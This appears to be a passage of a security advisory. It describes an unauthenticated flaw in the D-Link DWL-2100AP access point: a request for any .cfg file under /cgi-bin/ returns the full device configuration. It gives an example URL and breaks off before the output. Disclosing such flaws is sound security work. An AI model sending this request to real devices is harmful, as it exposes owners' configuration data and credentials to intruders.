Making a HTTP request to the /cgi-bin/ directory, the Web server will return error 404 (Page not found).
Making a HTTP request to the /cgi-bin/AnyFile.htm, the Web server will return error 404 (Page not found).
However, making a HTTP request to any file in /cgi-bin/ directory, with .cfg extension, will return all the device configuration.

For example, making the following request:

http://dlink-DWL-2100ap/cgi-bin/Intruders.cfg
We would have a result equivalent to the following:
